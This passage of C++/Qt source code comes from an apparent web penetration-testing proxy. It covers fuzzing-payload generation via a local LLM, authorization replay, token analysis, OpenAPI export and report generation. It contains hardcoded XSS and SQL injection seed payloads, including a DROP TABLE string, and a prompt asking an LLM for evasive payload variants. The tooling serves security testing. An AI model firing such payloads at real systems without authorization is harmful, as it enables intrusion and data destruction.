        if (count <= 0) count = 10;
        if (count > 50) count = 50;
        QString ollama = bodyJson.value("ollama").toString("http://127.0.0.1:11434");
        QString model  = bodyJson.value("model").toString("qwen2.5:14b");

        const QString prompt =
            "You generate fuzzing payloads for security testing.\n"
            "Category: " + kind + "\n"
            "Produce exactly " + QString::number(count) + " distinct payloads, one per line, "
            "no commentary, no numbering, no markdown. Each payload should be "
            "novel (try unusual encodings, alternate delimiters, edge-case characters) "
            "but still trigger the same vulnerability class.\n";

        QJsonObject ollReq;
        ollReq["model"]  = model;
        ollReq["prompt"] = prompt;
        ollReq["stream"] = false;
        const QByteArray ollBody = QJsonDocument(ollReq).toJson(QJsonDocument::Compact);

        const QUrl u(ollama + "/api/generate");
        QTcpSocket sock;
        sock.connectToHost(u.host(), static_cast<quint16>(u.port(11434)));
        if (!sock.waitForConnected(2000)) {
            // Fallback: ship a deterministic seed set per kind.
            QJsonArray fallback;
            if (kind == "xss") {
                static const char *seeds[] = {
                    "<script>alert(1)</script>",
                    "\"><svg onload=alert(1)>",
                    "javascript:alert(1)",
                    "<img src=x onerror=alert(1)>",
                    "<svg/onload=alert(1)>",
                    "<iframe src=javascript:alert(1)>",
                    "'><script>alert(1)</script>",
                };
                for (auto *s : seeds) fallback.append(QString::fromLatin1(s));
            } else if (kind == "sqli") {
                static const char *seeds[] = {
                    "' OR '1'='1", "' OR 1=1--", "\" OR \"\"=\"",
                    "'); DROP TABLE x;--", "1' UNION SELECT NULL--",
                };
                for (auto *s : seeds) fallback.append(QString::fromLatin1(s));
            } else {
                fallback.append("(no fallback list for kind=" + kind + ")");
            }
            return httpJson(200, QJsonObject{
                { "ok",        false },
                { "fallback",  true },
                { "model",     model },
                { "payloads",  fallback },
                { "error",     "ollama unreachable; returned seed list" }
            });
        }
        QByteArray req;
        req += "POST /api/generate HTTP/1.1\r\n";
        req += "Host: " + u.host().toUtf8() + ":" + QByteArray::number(u.port(11434)) + "\r\n";
        req += "Content-Type: application/json\r\n";
        req += "Content-Length: " + QByteArray::number(ollBody.size()) + "\r\n";
        req += "Connection: close\r\n\r\n";
        req += ollBody;
        sock.write(req);
        sock.waitForBytesWritten(2000);
        QByteArray resp2;
        while (sock.waitForReadyRead(15'000)) {
            resp2.append(sock.readAll());
            if (sock.state() == QAbstractSocket::UnconnectedState) break;
        }
        const int hdrEnd = resp2.indexOf("\r\n\r\n");
        const QJsonDocument d = hdrEnd > 0
            ? QJsonDocument::fromJson(resp2.mid(hdrEnd + 4))
            : QJsonDocument();
        const QString rawResponse = d.isObject()
            ? d.object().value("response").toString()
            : QString();
        QJsonArray payloads;
        for (const QString &line :
                rawResponse.split('\n', Qt::SkipEmptyParts)) {
            const QString trimmed = line.trimmed();
            if (trimmed.isEmpty()) continue;
            if (trimmed.startsWith("#")) continue;
            payloads.append(trimmed);
            if (payloads.size() >= count) break;
        }
        return httpJson(200, QJsonObject{
            { "ok",        true },
            { "model",     model },
            { "payloads",  payloads },
        });
    }

    // ---- Authorization tester (multi-user replay / IDOR) ------------
    // POST /api/authz-test {
    //   rowId: <int>,
    //   identities: [{name, headers: {Authorization, Cookie, ...}}]
    // }
    // Replays the captured request as each identity (overriding the
    // listed headers); compares responses; flags mismatches that suggest
    // BOLA / horizontal / vertical privilege issues. Burp Pro's
    // "Auth Analyzer" feature, open-sourced.
    if (path == "/api/authz-test") {
        if (!m_wiring.history)
            return okJson({{ "ok", false }, { "error", "no history" }});
        const int rid = bodyJson.value("rowId").toInt(0);
        if (rid <= 0)
            return okJson({{ "ok", false }, { "error", "rowId required" }});

        // Resolve the row -- in-memory window first, fall back to SQLite.
        Nullock::Proxy::HttpRequest baseReq;
        bool useTls = false;
        if (auto *src = m_wiring.history->requestById(rid)) {
            baseReq = *src;
            if (auto *r = m_wiring.history->responseById(rid))
                useTls = r->wasTls;
        } else if (m_wiring.projectStore) {
            auto *idx = m_wiring.projectStore->historyIndex();
            if (idx && idx->isOpen()) {
                auto fr = idx->loadFullRow(rid);
                if (fr.ok) { baseReq = std::move(fr.request); useTls = fr.response.wasTls; }
            }
        }
        if (baseReq.host.isEmpty())
            return okJson({{ "ok", false }, { "error", "row not found" }});
        if (blocksScope(baseReq.host))   // ScopeGuard: no authz replay off-scope
            return okJson({{ "ok", false }, { "scopeBlocked", true },
                           { "error", "row's host '" + baseReq.host + "' is out of scope" }});

        const QJsonArray ids = bodyJson.value("identities").toArray();
        if (ids.isEmpty())
            return okJson({{ "ok", false }, { "error", "identities[] required" }});

        Nullock::Core::HttpClient client;
        QJsonArray results;
        for (const QJsonValue &iv : ids) {
            const QJsonObject id = iv.toObject();
            const QString name = id.value("name").toString();
            const QJsonObject headers = id.value("headers").toObject();
            // Build a new request: clone baseReq, overlay headers.
            Nullock::Proxy::HttpRequest req = baseReq;
            QList<QPair<QString, QString>> filtered;
            QSet<QString> overrideKeys;
            for (const QString &k : headers.keys())
                overrideKeys.insert(k.toLower());
            // Drop existing same-name headers we're overriding.
            for (const auto &h : baseReq.headers) {
                if (overrideKeys.contains(h.first.toLower())) continue;
                filtered.append(h);
            }
            for (const QString &k : headers.keys())
                filtered.append({ k, headers.value(k).toString() });
            req.headers = filtered;

            const QByteArray bytes = Nullock::Proxy::serializeRequestForOrigin(req);
            const auto res = client.send(req.host,
                static_cast<quint16>(req.port), useTls, bytes);
            QJsonObject r;
            r["identity"]   = name;
            r["ok"]         = res.ok;
            r["status"]     = res.ok ? res.parsed.statusCode : 0;
            r["bodySize"]   = res.ok ? static_cast<qint64>(res.parsed.body.size()) : 0;
            r["error"]      = res.ok ? QString() : res.errorMessage;
            results.append(r);
        }

        // Compare across identities: if statuses or bodySizes diverge,
        // flag a finding. Same-shape = consistent access control.
        QSet<int> distinctStatuses;
        QSet<qint64> distinctSizes;
        for (const QJsonValue &v : results) {
            const QJsonObject r = v.toObject();
            if (r.value("ok").toBool()) {
                distinctStatuses.insert(r.value("status").toInt());
                distinctSizes.insert(static_cast<qint64>(r.value("bodySize").toDouble()));
            }
        }
        const bool divergent = distinctStatuses.size() > 1
                            || distinctSizes.size() > 1;
        if (divergent && m_wiring.scanner) {
            m_wiring.scanner->reportFinding(rid, "high", "authz-divergence",
                "Multi-identity replay shows divergent responses (BOLA / horizontal / vertical privilege candidate)",
                "statuses=" + [&]{
                    QStringList ss;
                    for (int s : distinctStatuses) ss.append(QString::number(s));
                    return ss.join(",");
                }() +
                " · sizes=" + [&]{
                    QStringList ss;
                    for (qint64 s : distinctSizes) ss.append(QString::number(s));
                    return ss.join(",");
                }(),
                baseReq.host,
                (useTls ? "https://" : "http://") + baseReq.host + baseReq.path);
        }
        return httpJson(200, QJsonObject{
            { "ok",        true },
            { "divergent", divergent },
            { "results",   results },
            { "row",       rid },
        });
    }

    // ---- Sequencer (token randomness analyzer) -----------------------
    // POST /api/sequencer/analyze { tokens: [str, str, ...] }
    // Burp's Sequencer equivalent. Statistical tests on a captured
    // corpus of session-style tokens. Returns per-test scores + verdict.
    if (path == "/api/sequencer/analyze") {
        QStringList tokens;
        for (const QJsonValue &v : bodyJson.value("tokens").toArray())
            tokens.append(v.toString());
        Nullock::Core::Sequencer seq;
        return httpJson(200, seq.analyze(tokens));
    }

    // ---- Reverse OpenAPI ---------------------------------------------
    // GET /api/openapi/export -- walks captured history and synthesizes
    // an OpenAPI 3.1 spec describing every (host, path, method) seen.
    // Per-operation metadata is intentionally light -- response codes
    // are collected as `responses: { code: { description } }`, no
    // schemas. Real use is: pipe this into a code-gen tool, or hand
    // to a developer as "here's the surface I saw, please document it."
    if (path == "/api/openapi/export") {
        if (!m_wiring.projectStore)
            return httpJson(404, QJsonObject{{ "error", "no project store" }});
        auto *idx = m_wiring.projectStore->historyIndex();
        if (!idx || !idx->isOpen())
            return httpJson(503, QJsonObject{{ "error", "history index not ready" }});

        // hostKey = (scheme, host, port). For each, collect path -> method -> set<status>.
        struct OpInfo {
            QSet<int> statuses;
            QStringList mimes;
        };
        QMap<QString, QMap<QString, QMap<QString, OpInfo>>> byHost;
        for (int id : idx->allIds()) {
            auto fr = idx->loadFullRow(id);
            if (!fr.ok) continue;
            if (fr.request.method.startsWith("WS")) continue;
            const QString scheme  = fr.response.wasTls ? "https" : "http";
            const QString hostKey = scheme + "://" + fr.request.host
                + (fr.request.port == (fr.response.wasTls ? 443 : 80)
                    ? QString()
                    : ":" + QString::number(fr.request.port));
            QString pathOnly = fr.request.path;
            const int q = pathOnly.indexOf('?');
            if (q >= 0) pathOnly = pathOnly.left(q);
            auto &op = byHost[hostKey][pathOnly][fr.request.method.toLower()];
            op.statuses.insert(fr.response.statusCode);
        }
        QJsonObject spec;
        spec["openapi"] = "3.1.0";
        QJsonObject info;
        info["title"]   = "Reverse-engineered from Nullock capture";
        info["version"] = "0.0.0";
        spec["info"] = info;
        QJsonArray servers;
        for (auto hit = byHost.cbegin(); hit != byHost.cend(); ++hit) {
            QJsonObject s; s["url"] = hit.key(); servers.append(s);
        }
        spec["servers"] = servers;
        QJsonObject paths;
        for (auto hit = byHost.cbegin(); hit != byHost.cend(); ++hit) {
            for (auto pit = hit->cbegin(); pit != hit->cend(); ++pit) {
                QJsonObject pathObj = paths.value(pit.key()).toObject();
                for (auto mit = pit->cbegin(); mit != pit->cend(); ++mit) {
                    QJsonObject responses;
                    for (int st : mit->statuses) {
                        QJsonObject r;
                        r["description"] = QString("observed status %1").arg(st);
                        responses[QString::number(st)] = r;
                    }
                    // If this (path, method) was already seen on a
                    // different host, MERGE rather than clobber: tack
                    // the new host onto x-nullock-hosts (array) and
                    // union the response codes.
                    QJsonObject op = pathObj.value(mit.key()).toObject();
                    QJsonArray  hosts = op.value("x-nullock-hosts").toArray();
                    if (!hosts.contains(QJsonValue(hit.key())))
                        hosts.append(hit.key());
                    op["x-nullock-hosts"] = hosts;
                    QJsonObject existingResp = op.value("responses").toObject();
                    for (const QString &code : responses.keys())
                        existingResp[code] = responses.value(code);
                    op["responses"] = existingResp;
                    pathObj[mit.key()] = op;
                }
                paths[pit.key()] = pathObj;
            }
        }
        spec["paths"] = paths;
        return httpJson(200, spec);
    }

    // ---- AI-assisted finding triage ----------------------------------
    // POST /api/triage/finding { rowId, kind, severity, summary, evidence }
    //   ?model=qwen2.5:14b (default)
    //   ?ollama=http://127.0.0.1:11434 (default)
    // Asks a local Ollama model to grade impact / suggest fix / flag
    // false-positive risk. Fire-and-forget over HTTP to Ollama's
    // /api/generate. Falls back to a heuristic if Ollama isn't running.
    if (path == "/api/triage/finding") {
        QString ollama = "http://127.0.0.1:11434";
        QString model  = "qwen2.5:14b";
        if (!query.isEmpty()) {
            const QUrlQuery q(query);
            if (!q.queryItemValue("ollama").isEmpty()) ollama = q.queryItemValue("ollama");
            if (!q.queryItemValue("model").isEmpty())  model  = q.queryItemValue("model");
        }
        const QString summary  = bodyJson.value("summary").toString();
        const QString kind     = bodyJson.value("kind").toString();
        const QString severity = bodyJson.value("severity").toString();
        const QString evidence = bodyJson.value("evidence").toString();
        // Optional context: rowId pulls the captured request/response
        // raw text and inlines them so the model has the real payload.
        QString rawCtx;
        const int rowId = bodyJson.value("rowId").toInt(0);
        if (rowId > 0 && m_wiring.history) {
            const QString req  = m_wiring.history->requestRawById(rowId);
            const QString resp = m_wiring.history->responseRawById(rowId);
            if (!req.isEmpty())  rawCtx += "\n\n--- captured request ---\n" + req.left(8 * 1024);
            if (!resp.isEmpty()) rawCtx += "\n\n--- captured response ---\n" + resp.left(8 * 1024);
        }
        const QString prompt =
            "You are a senior application security analyst. Triage this "
            "finding from a passive proxy scan. Be concise (under 200 "
            "words). Cover: real impact, suggested fix in one line, and "
            "false-positive likelihood as low/med/high.\n\n"
            "kind: " + kind + "\nseverity: " + severity +
            "\nsummary: " + summary + "\nevidence: " + evidence + rawCtx;

        QJsonObject ollamaReq;
        ollamaReq["model"]   = model;
        ollamaReq["prompt"]  = prompt;
        ollamaReq["stream"]  = false;
        const QByteArray ollamaBody = QJsonDocument(ollamaReq).toJson(QJsonDocument::Compact);

        // Crude HTTP/1.1 POST to Ollama. Synchronous; the snapshot
        // poll has its own timeout so the user sees the spinner.
        const QUrl u(ollama + "/api/generate");
        QTcpSocket sock;
        sock.connectToHost(u.host(), static_cast<quint16>(u.port(11434)));
        if (!sock.waitForConnected(2000)) {
            QJsonObject r;
            r["ok"]     = false;
            r["error"]  = "ollama unreachable at " + ollama;
            r["model"]  = model;
            r["triage"] = "(heuristic) " + severity.toUpper() + ": " + summary
                + " -- evidence suggests "
                + (severity == "critical" || severity == "high"
                    ? "real impact; verify and patch"
                    : "low-impact informational; deprioritize")
                + ". Fix: see kind=" + kind + " docs.";
            return httpJson(200, r);
        }
        QByteArray req;
        req += "POST /api/generate HTTP/1.1\r\n";
        req += "Host: " + u.host().toUtf8() + ":" + QByteArray::number(u.port(11434)) + "\r\n";
        req += "Content-Type: application/json\r\n";
        req += "Content-Length: " + QByteArray::number(ollamaBody.size()) + "\r\n";
        req += "Connection: close\r\n\r\n";
        req += ollamaBody;
        sock.write(req);
        sock.waitForBytesWritten(2000);
        QByteArray resp;
        while (sock.waitForReadyRead(15'000)) {
            resp.append(sock.readAll());
            if (sock.state() == QAbstractSocket::UnconnectedState) break;
        }
        const int hdrEnd = resp.indexOf("\r\n\r\n");
        const QJsonDocument d = hdrEnd > 0
            ? QJsonDocument::fromJson(resp.mid(hdrEnd + 4))
            : QJsonDocument();
        QJsonObject r;
        r["ok"]     = true;
        r["model"]  = model;
        r["triage"] = d.isObject()
            ? d.object().value("response").toString()
            : QString("(empty response from ollama)");
        return httpJson(200, r);
    }

    // ---- Cookie tomography -------------------------------------------
    // GET /api/cookies -- inventory of every cookie captured per host
    // with security flag breakdown. Replaces the diff'ing that pen-testers
    // do by hand when a target sets dozens of cookies across login.
    if (path == "/api/cookies") {
        if (!m_wiring.sessions)
            return httpJson(200, QJsonObject{{ "hosts", QJsonArray() }});
        QJsonArray hosts;
        for (const auto &h : m_wiring.sessions->sessions()) {
            QJsonObject hostObj;
            hostObj["host"]       = h.host;
            hostObj["lastSeenMs"] = static_cast<double>(h.lastSeen);
            hostObj["autoInject"] = h.autoInject;
            QJsonArray cookies;
            int httpOnlyCnt = 0, secureCnt = 0, sameSiteCnt = 0;
            for (const auto &c : h.cookies) {
                QJsonObject co;
                co["name"]     = c.name;
                co["valueLen"] = c.value.size();
                co["path"]     = c.path;
                co["expires"]  = c.expires;
                co["httpOnly"] = c.httpOnly;
                co["secure"]   = c.secure;
                co["sameSite"] = c.sameSite;
                if (c.httpOnly) ++httpOnlyCnt;
                if (c.secure)   ++secureCnt;
                if (!c.sameSite.isEmpty()) ++sameSiteCnt;
                cookies.append(co);
            }
            hostObj["cookies"]      = cookies;
            hostObj["count"]        = cookies.size();
            hostObj["httpOnlyPct"]  = cookies.size()
                ? int(100 * httpOnlyCnt / cookies.size()) : 0;
            hostObj["securePct"]    = cookies.size()
                ? int(100 * secureCnt   / cookies.size()) : 0;
            hostObj["sameSitePct"]  = cookies.size()
                ? int(100 * sameSiteCnt / cookies.size()) : 0;
            hosts.append(hostObj);
        }
        QJsonObject root; root["hosts"] = hosts;
        return httpJson(200, root);
    }

    // ---- Project templates -------------------------------------------
    // GET /api/project/templates -- list available templates
    // POST /api/project/create-from-template { templateId, projectName }
    if (path == "/api/project/templates") {
        QStringList searchDirs;
        searchDirs << (m_wiring.uiDir + "/../templates/projects");
        searchDirs << (QCoreApplication::applicationDirPath()
                       + "/../../../../templates/projects");
        searchDirs << (QCoreApplication::applicationDirPath()
                       + "/../share/nullock/templates/projects");
        QJsonArray arr;
        QSet<QString> seenIds;
        for (const QString &dir : searchDirs) {
            if (!QFileInfo::exists(dir)) continue;
            for (const QString &f : QDir(dir).entryList({"*.json"}, QDir::Files)) {
                QFile fp(dir + "/" + f);
                if (!fp.open(QIODevice::ReadOnly)) continue;
                const QJsonDocument d = QJsonDocument::fromJson(fp.readAll());
                if (!d.isObject()) continue;
                const QJsonObject o = d.object();
                const QString id = o.value("id").toString();
                if (id.isEmpty() || seenIds.contains(id)) continue;
                seenIds.insert(id);
                QJsonObject summary;
                summary["id"]          = id;
                summary["name"]        = o.value("name").toString();
                summary["description"] = o.value("description").toString();
                summary["inScope"]     = o.value("inScope");
                summary["outOfScope"]  = o.value("outOfScope");
                summary["extensionsEnabled"] = o.value("extensionsEnabled");
                arr.append(summary);
            }
        }
        QJsonObject root; root["templates"] = arr;
        return httpJson(200, root);
    }
    if (path == "/api/project/create-from-template") {
        if (!m_wiring.projectStore)
            return okJson({{ "ok", false }, { "error", "no project store" }});
        const QString tplId = bodyJson.value("templateId").toString();
        const QString name  = bodyJson.value("projectName").toString();
        if (tplId.isEmpty() || name.isEmpty())
            return okJson({{ "ok", false }, { "error",
                                              "templateId and projectName required" }});
        QStringList searchDirs;
        searchDirs << (m_wiring.uiDir + "/../templates/projects");
        searchDirs << (QCoreApplication::applicationDirPath()
                       + "/../../../../templates/projects");
        searchDirs << (QCoreApplication::applicationDirPath()
                       + "/../share/nullock/templates/projects");
        QJsonObject tplObj;
        for (const QString &dir : searchDirs) {
            const QString fpath = dir + "/" + tplId + ".json";
            if (!QFileInfo::exists(fpath)) continue;
            QFile fp(fpath);
            if (!fp.open(QIODevice::ReadOnly)) continue;
            const QJsonDocument d = QJsonDocument::fromJson(fp.readAll());
            if (d.isObject()) { tplObj = d.object(); break; }
        }
        if (tplObj.isEmpty())
            return okJson({{ "ok", false }, { "error", "template not found: " + tplId }});

        if (!m_wiring.projectStore->createProject(name))
            return okJson({{ "ok", false }, { "error", "createProject failed" }});

        // Apply template metadata on top of the empty project.
        QStringList inS;
        for (const auto &v : tplObj.value("inScope").toArray()) inS.append(v.toString());
        QStringList outS;
        for (const auto &v : tplObj.value("outOfScope").toArray()) outS.append(v.toString());
        m_wiring.projectStore->setInScope(inS);
        m_wiring.projectStore->setOutOfScope(outS);
        m_wiring.projectStore->setNotes(tplObj.value("notes").toString());
        return okJson({{ "ok", true }, { "project", name },
                       { "applied", tplId }});
    }

    // ---- Report builder ----------------------------------------------
    // POST /api/report/build -- produces a Markdown engagement report
    // from findings + scope + notes + session metadata. Useful as a
    // first-pass draft the user can hand to their report-writing
    // pipeline.
    if (path == "/api/report/build") {
        QString out;
        const QString proj = m_wiring.projectStore
            ? m_wiring.projectStore->metadata().name : QStringLiteral("default");
        out += "# Nullock engagement report -- " + proj + "\n\n";
        out += "*Generated " + QDateTime::currentDateTime().toString(Qt::ISODate) + "*\n\n";

        out += "## Scope\n\n";
        if (m_wiring.projectStore) {
            const auto meta = m_wiring.projectStore->metadata();
            out += "**In-scope hosts:**\n";
            for (const auto &s : meta.inScope) out += "- `" + s + "`\n";
            if (meta.inScope.isEmpty()) out += "_(no hosts configured)_\n";
            out += "\n**Out-of-scope hosts:**\n";
            for (const auto &s : meta.outOfScope) out += "- `" + s + "`\n";
            if (meta.outOfScope.isEmpty()) out += "_(none)_\n";
            out += "\n";
            if (!meta.notes.isEmpty()) {
                out += "## Notes\n\n";
                out += meta.notes + "\n\n";
            }
        }

        out += "## Findings\n\n";
        if (m_wiring.scanner) {
            const auto findings = m_wiring.scanner->findings(0);
            // Group by severity, descending.
            QMap<QString, QList<Nullock::Core::Finding>> bySev;
            const QStringList severityOrder = {"critical", "high", "medium", "low", "info"};
            for (const auto &f : findings) bySev[f.severity.toLower()].append(f);
            for (const QString &sev : severityOrder) {
                if (!bySev.contains(sev)) continue;
                out += "### " + sev.toUpper() + " (" +
                       QString::number(bySev[sev].size()) + ")\n\n";
                for (const auto &f : bySev[sev]) {
                    out += "- **" + f.kind + "** at " + f.host + " — " + f.summary + "\n";
                    if (!f.url.isEmpty()) out += "  - URL: `" + f.url + "`\n";
                    if (!f.evidence.isEmpty()) {
                        out += "  - Evidence: `" + f.evidence.left(200) + "`\n";
                    }
                }
                out += "\n";
            }
            out += "Total findings: **" + QString::number(findings.size()) + "**\n\n";
        } else {
            out += "_(scanner not wired)_\n\n";
        }

        out += "## Captured surface\n\n";
        if (m_wiring.projectStore) {
            auto *idx = m_wiring.projectStore->historyIndex();
            const int total = idx ? idx->rowCount() : 0;
            out += "**Total captured requests:** " + QString::number(total) + "\n\n";
        }

        out += "## Methodology\n\n";
        out += "- Tool: Nullock (https://github.com/Bikebrainz/Nullock)\n";
        out += "- Passive scanner enabled throughout\n";
        out += "- Active probe applied to in-scope rows with query parameters\n";
        out += "- OAST callbacks monitored for blind SSRF / blind XSS / OOB-DNS\n\n";

        out += "---\n";
        out += "*Report auto-generated by Nullock. Review before distribution.*\n";

        QByteArray hdr;
        hdr += "HTTP/1.1 200 OK\r\n";
        hdr += "Content-Type: text/markdown; charset=utf-8\r\n";
        hdr += "Content-Disposition: attachment; filename=\"nullock-report.md\"\r\n";
        const QByteArray body = out.toUtf8();
        hdr += "Content-Length: " + QByteArray::number(body.size()) + "\r\n";
        hdr += "Connection: close\r\n\r\n";
        return hdr + body;
    }

    // ---- HTML report composer ----------------------------------------
    // POST /api/report/html -- a self-contained, styled HTML engagement
    // report (exec summary + severity breakdown + per-finding CWE/OWASP/
    // CVSS/fix table). No network, operates on existing findings + project
    // metadata. EVERY piece of server/target-derived text is HTML-escaped --
    // a security tool's own report must not become an XSS vector when the
    // operator opens it in a browser.
    if (path == "/api/report/html") {
        auto esc = [](const QString &s) -> QString { return s.toHtmlEscaped(); };
        auto sevColor = [](const QString &s) -> QString {
            if (s == "critical") return QStringLiteral("#b91c1c");
            if (s == "high")     return QStringLiteral("#ea580c");
            if (s == "medium")   return QStringLiteral("#d97706");
            if (s == "low")      return QStringLiteral("#3f8f29");
            return QStringLiteral("#0891b2"); // info
        };
        const QString proj = m_wiring.projectStore
            ? m_wiring.projectStore->metadata().name : QStringLiteral("default");

        QList<Nullock::Core::Finding> findings;
        if (m_wiring.scanner) findings = m_wiring.scanner->findings(0);
        const PostureGrade pg = computePostureGrade(findings);  // shared with /api/posture
        const QStringList order = { "critical", "high", "medium", "low", "info" };
        QMap<QString, QList<Nullock::Core::Finding>> bySev;
        for (const auto &f : findings) {
            // Coalesce empty/blank severity to "info" so it never renders as a
            // nameless group, and group case-insensitively (trim too, so the
            // cards/bar agree with the grade badge for padded severities).
            const QString t = f.severity.trimmed().toLower();
            const QString k = t.isEmpty() ? QStringLiteral("info") : t;
            bySev[k].append(f);
        }
        // The render order: the five standard severities first, then any
        // non-standard severity present -- used for the cards, the bar, AND the
        // findings table so all three are consistent and nothing is undercounted.
        QStringList renderOrder = order;
        for (const QString &kk : bySev.keys())
            if (!order.contains(kk)) renderOrder.append(kk);

        QString h;
        h += "<!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\">";
        h += "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">";
        h += "<title>Nullock report &mdash; " + esc(proj) + "</title><style>"
             ":root{--fg:#1f2933;--muted:#6b7280;--line:#e5e7eb;--bg:#fff}"
             "*{box-sizing:border-box}"
             "body{font:14px/1.55 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;"
             "color:var(--fg);background:#f3f4f6;margin:0;padding:32px}"
             ".wrap{max-width:980px;margin:0 auto;background:var(--bg);border:1px solid var(--line);"
             "border-radius:12px;padding:40px 48px;box-shadow:0 1px 3px rgba(0,0,0,.06)}"
             "h1{font-size:24px;margin:0 0 4px}h2{font-size:17px;margin:32px 0 12px;"
             "border-bottom:2px solid var(--line);padding-bottom:6px}"
             ".sub{color:var(--muted);font-size:13px;margin:0 0 24px}"
             ".cards{display:flex;gap:10px;flex-wrap:wrap;margin:18px 0}"
             ".card{flex:1;min-width:90px;border:1px solid var(--line);border-radius:10px;"
             "padding:14px;text-align:center}.card .n{font-size:26px;font-weight:700}"
             ".card .l{font-size:11px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}"
             ".bar{display:flex;height:14px;border-radius:7px;overflow:hidden;margin:6px 0 24px;background:var(--line)}"
             ".bar span{display:block}"
             "table{width:100%;border-collapse:collapse;margin:6px 0 12px;font-size:13px}"
             "th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}"
             "th{font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}"
             "code{background:#f3f4f6;padding:1px 5px;border-radius:4px;font-size:12px;word-break:break-all}"
             ".pill{display:inline-block;color:#fff;font-size:11px;font-weight:700;padding:2px 8px;"
             "border-radius:10px;text-transform:uppercase}"
             ".ev{color:var(--muted);font-size:12px;max-width:340px;word-break:break-word}"
             ".tag{display:inline-block;background:#eef2ff;color:#3730a3;border-radius:4px;"
             "padding:1px 6px;font-size:11px;margin:1px 2px 1px 0}"
             ".grade{display:inline-flex;align-items:baseline;gap:10px;margin:6px 0 2px;"
             "padding:10px 18px;border-radius:10px;color:#fff;font-weight:700}"
             ".grade .g{font-size:30px;line-height:1}.grade .s{font-size:13px;font-weight:600;opacity:.92}"
             "footer{margin-top:36px;color:var(--muted);font-size:12px;border-top:1px solid var(--line);padding-top:14px}"
             "</style></head><body><div class=\"wrap\">";

        h += "<h1>Nullock engagement report</h1>";
        h += "<p class=\"sub\">Project <strong>" + esc(proj) + "</strong> &middot; generated "
             + esc(QDateTime::currentDateTime().toString(Qt::ISODate)) + "</p>";

        // Security posture grade badge (shared scoring with /api/posture).
        auto gradeColor = [](const QString &g) -> QString {
            if (g == "A") return QStringLiteral("#15803d");
            if (g == "B") return QStringLiteral("#3f8f29");
            if (g == "C") return QStringLiteral("#d97706");
            if (g == "D") return QStringLiteral("#ea580c");
            return QStringLiteral("#b91c1c"); // F
        };
        h += "<div class=\"grade\" style=\"background:" + gradeColor(pg.grade) + "\">"
             "<span class=\"g\">" + pg.grade + "</span>"
             "<span class=\"s\">security posture &mdash; " + QString::number(pg.score)
             + "/100</span></div>";

        // Severity summary cards + stacked bar.
        h += "<div class=\"cards\">";
        h += "<div class=\"card\"><div class=\"n\">" + QString::number(findings.size())
             + "</div><div class=\"l\">total</div></div>";
        for (const QString &sev : renderOrder) {
            const int n = bySev.value(sev).size();
            h += "<div class=\"card\"><div class=\"n\" style=\"color:" + sevColor(sev) + "\">"
                 + QString::number(n) + "</div><div class=\"l\">" + esc(sev) + "</div></div>";
        }
        h += "</div>";
        if (!findings.isEmpty()) {
            h += "<div class=\"bar\">";
            for (const QString &sev : renderOrder) {
                const int n = bySev.value(sev).size();
                if (n <= 0) continue;
                const double pct = 100.0 * n / findings.size();
                h += "<span style=\"width:" + QString::number(pct, 'f', 2) + "%;background:"
                     + sevColor(sev) + "\" title=\"" + sev + ": " + QString::number(n) + "\"></span>";
            }
            h += "</div>";
        }

        // Scope.
        if (m_wiring.projectStore) {
            const auto meta = m_wiring.projectStore->metadata();
            h += "<h2>Scope</h2><p class=\"sub\" style=\"margin:0\">In-scope: ";
            if (meta.inScope.isEmpty()) h += "<em>none configured</em>";
            else { QStringList s; for (const auto &x : meta.inScope) s << "<code>" + esc(x) + "</code>"; h += s.join(" "); }
            if (!meta.outOfScope.isEmpty()) {
                QStringList s; for (const auto &x : meta.outOfScope) s << "<code>" + esc(x) + "</code>";
                h += "<br>Out-of-scope: " + s.join(" ");
            }
            h += "</p>";
        }

        // Findings, grouped by severity. Uses the same renderOrder as the
        // cards/bar so every finding appears exactly once.
        h += "<h2>Findings</h2>";
        if (findings.isEmpty()) {
            h += "<p class=\"sub\">No findings recorded.</p>";
        } else {
            for (const QString &sev : renderOrder) {
                const auto &group = bySev.value(sev);
                if (group.isEmpty()) continue;
                h += "<h3 style=\"margin:22px 0 6px\"><span class=\"pill\" style=\"background:"
                     + sevColor(sev) + "\">" + esc(sev) + "</span> &nbsp;" + QString::number(group.size())
                     + " finding" + (group.size() == 1 ? "" : "s") + "</h3>";
                h += "<table><thead><tr><th>Issue</th><th>Host / location</th>"
                     "<th>CVSS</th><th>Mapping</th><th>Evidence &amp; fix</th></tr></thead><tbody>";
                for (const auto &f : group) {
                    h += "<tr>";
                    h += "<td><strong>" + esc(f.kind) + "</strong><br><span class=\"ev\">"
                         + esc(f.summary) + "</span></td>";
                    h += "<td><code>" + esc(f.host) + "</code>";
                    if (!f.url.isEmpty()) h += "<br><code>" + esc(f.url) + "</code>";
                    h += "</td>";
                    h += "<td>" + (f.cvssScore > 0.0 ? QString::number(f.cvssScore, 'f', 1)
                                                     : QStringLiteral("&mdash;")) + "</td>";
                    QString mapping;
                    if (!f.cwe.isEmpty())   mapping += "<span class=\"tag\">" + esc(f.cwe) + "</span>";
                    if (!f.owasp.isEmpty()) mapping += "<span class=\"tag\">" + esc(f.owasp) + "</span>";
                    for (const auto &c : f.compliance) mapping += "<span class=\"tag\">" + esc(c) + "</span>";
                    h += "<td>" + (mapping.isEmpty() ? QStringLiteral("&mdash;") : mapping) + "</td>";
                    QString last;
                    if (!f.evidence.isEmpty())
                        last += "<span class=\"ev\">" + esc(f.evidence.left(300)) + "</span>";
                    if (!f.fixSummary.isEmpty())
                        last += "<br><span class=\"ev\" style=\"color:#3f8f29\">Fix: " + esc(f.fixSummary) + "</span>";
                    h += "<td>" + (last.isEmpty() ? QStringLiteral("&mdash;") : last) + "</td>";
                    h += "</tr>";
                }
                h += "</tbody></table>";
            }
        }

        h += "<footer>Auto-generated by <a href=\"https://github.com/Bikebrainz/Nullock\">Nullock</a>. "
             "Passive scanner active throughout; active probes applied to in-scope targets; "
             "OAST callbacks monitored for blind SSRF/XSS/OOB-DNS. Review before distribution.</footer>";
        h += "</div></body></html>";

        QByteArray hdr;
        hdr += "HTTP/1.1 200 OK\r\n";
        hdr += "Content-Type: text/html; charset=utf-8\r\n";
        hdr += "Content-Disposition: attachment; filename=\"nullock-report.html\"\r\n";
        const QByteArray body = h.toUtf8();
        hdr += "Content-Length: " + QByteArray::number(body.size()) + "\r\n";
